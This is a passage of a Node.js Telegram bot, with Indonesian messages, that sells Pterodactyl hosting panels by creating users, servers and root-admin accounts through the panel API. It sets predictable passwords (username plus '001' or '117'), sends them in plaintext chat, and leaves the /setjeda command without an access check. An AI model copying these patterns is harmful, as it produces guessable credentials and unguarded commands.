        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /9gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "9gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "9048";
  const cpu = "260";
  const disk = "9048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya­ЪўЂ
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
├Ќ═ю├Ќ Login : ${domain}
├Ќ═ю├Ќ Username : ${user.username}
├Ќ═ю├Ќ Password : ${password} 
РћЈРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
РћѓRULES :
РћѓРђб Jangan Ddos Server
РћѓРђб Wajib tutup domain saat screenshot
РћѓРђб Jngan bagikan domain ke siapapun
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌЋ­ЮЌг ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!­ЪћЦ"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan­Ъў«РђЇ­Ъње.");
  }
});
//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//
// 10gb
bot.onText(/\/10gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /10gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "10gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "10000";
  const cpu = "290";
  const disk = "10000";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya­ЪўЂ
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}
 PANEL DATA ANDA :
├Ќ═ю├Ќ Login : ${domain}
├Ќ═ю├Ќ Username : ${user.username}
├Ќ═ю├Ќ Password : ${password} 
РћЈРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
РћѓRULES :
РћѓРђб Jangan Ddos Server
РћѓРђб Wajib tutup domain saat screenshot
РћѓРђб Jngan bagikan domain ke siapapun
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌЋ­ЮЌг ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!­ЪћЦ"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan­Ъў«РђЇ­Ъње.");
  }
});
bot.onText(/\/11gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /10gb namapanel,idtele");
    return;
  }
  const username = t[0];
  
  const u = t[1];
  const name = username + "10gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "11000";
  const cpu = "290";
  const disk = "10000";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya­ЪўЂ
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
Рѕџ Login : ${domain}
Рѕџ Username : ${user.username}
Рѕџ Password : ${password} 
РћЈРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
РћѓRULES :
РћѓРђб Jangan Ddos Server
РћѓРђб Wajib tutup domain saat screenshot
РћѓРђб Jngan bagikan domain ke siapapun
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌЋ­ЮЌг ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!­ЪћЦ"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan­Ъў«РђЇ­Ъње.");
  }
});

// unli
bot.onText(/\/unli (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /unli namapanel,idtele");
    return;
  }
  const username = t[0]; 
  const u = t[1];
  const name = username + "unli";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "0";
  const cpu = "0";
  const disk = "0";
  const email = `${username}@unli.OTAX`;
  const akunlo = randomImage;
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel KingOtax");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya­ЪўЂ
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
├Ќ═ю├Ќ Login : ${domain}
├Ќ═ю├Ќ Username : ${user.username}
├Ќ═ю├Ќ Password : ${password} 
РћЈРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
RULES :
РћѓРђб Jangan Ddos Server
РћѓРђб Wajib tutup domain saat screenshot
РћѓРђб Jngan bagikan domain ke siapapun
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌЋ­ЮЌг ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!­ЪћЦ"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan­Ъў«РђЇ­Ъње.");
  }
});
//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//
// createadmin
bot.onText(/\/createadmin (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
    if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
            { parse_mode: "Markdown" }
        );
  }
  const commandParams = match[1].split(",");
  const panelName = commandParams[0].trim();
  const telegramId = commandParams[1].trim();
  if (commandParams.length < 2) {
    bot.sendMessage(
      chatId,
      "Format Salah! Penggunaan: /createadmin namapanel,idtele"
    );
    return;
  }
  const password = panelName + "117";
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: `${panelName}@admin.OTAX`,
        username: panelName,
        first_name: panelName,
        last_name: "Memb",
        language: "en",
        root_admin: true,
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      bot.sendMessage(chatId, JSON.stringify(data.errors[0], null, 2));
      return;
    }
    const user = data.attributes;
    const userInfo = `
TYPE: user
РъЪ ID: ${user.id}
РъЪ USERNAME: ${user.username}
РъЪ EMAIL: ${user.email}
РъЪ NAME: ${user.first_name} ${user.last_name}
РъЪ LANGUAGE: ${user.language}
РъЪ ADMIN: ${user.root_admin}
РъЪ CREATED AT: ${user.created_at}
    `;
    bot.sendMessage(chatId, userInfo);
    bot.sendMessage(
      telegramId,
      `
РћЈРћЂРгБРЮЈсђї INFO DATA ADMIN PANEL сђЇРЮЈ
РћѓРъЦ  Login : ${domain}
РћѓРъЦ  Username : ${user.username}
РћѓРъЦ  Password : ${password} 
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
Рћѓ Rules : 
РћѓРђб Jangan Curi Sc
РћѓРђб Jangan Buka Panel Orang
РћѓРђб Jangan Ddos Server
РћѓРђб Kalo jualan sensor domainnya
РћѓРђб Jangan Bagi┬▓ Panel Free!­ЪўА
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
р┤Јр┤Џр┤ђx ╩юр┤Є╩ђр┤Є!
    `
    );
  } catch (error) {
    console.error(error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan dalam pembuatan admin. Silakan coba lagi nanti."
    );
  }
});
  
//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//
// listsrv
bot.onText(/\/listsrv/, async (msg) => {
     const chatId = msg.chat.id;
    const senderId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
            { parse_mode: "Markdown" }
        );
  }
  let page = 1; 
  try {
    let f = await fetch(`${domain}/api/application/servers?page=${page}`, {
      
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });
    let res = await f.json();
    let servers = res.data;
    let messageText = "Daftar server aktif yang dimiliki:\n\n";
    for (let server of servers) {
      let s = server.attributes;

      let f3 = await fetch(
        `${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`,
        {
          method: "GET",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${pltc}`,
          },
        }
      );
      let data = await f3.json();
      let status = data.attributes ? data.attributes.current_state : s.status;

      messageText += `ID Server: ${s.id}\n`;
      messageText += `Nama Server: ${s.name}\n`;
      messageText += `Status: ${status}\n\n`;
    }

    bot.sendMessage(chatId, messageText);
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "Terjadi kesalahan dalam memproses permintaan.");
  }
});



bot.onText(/\/reqpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (shouldIgnoreMessage(msg)) return;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
   if (shouldIgnoreMessage(msg)) return;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ ­ЮЎѕ­ЮЎџ­ЮЎа!? ­ЮЎѓ­ЮЎќ ­Юў╝­ЮЎЎ­ЮЎќ ­ЮЎЃ­ЮЎќ­ЮЎа ­Юўй­ЮЎф­ЮЎќ­ЮЎЕ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎц­ЮЎб­ЮЎб­ЮЎќ­ЮЎБ­ЮЎЎ ­ЮЎё­ЮЎБ­ЮЎъ├Ќ═ю├Ќ");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "­ЪЎѕ Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "­ЪЎѕ Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "­ЪЎѕ Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "­ЪЎѕ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `­ЪћЦ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `­ЪћЦ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "­ЪЎѕ You are not authorized to view the prem list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "­ЪЊї No premium users found.");
  }

  let message = "```L I S T - R E G I S T \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id
    if (shouldIgnoreMessage(msg)) return;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
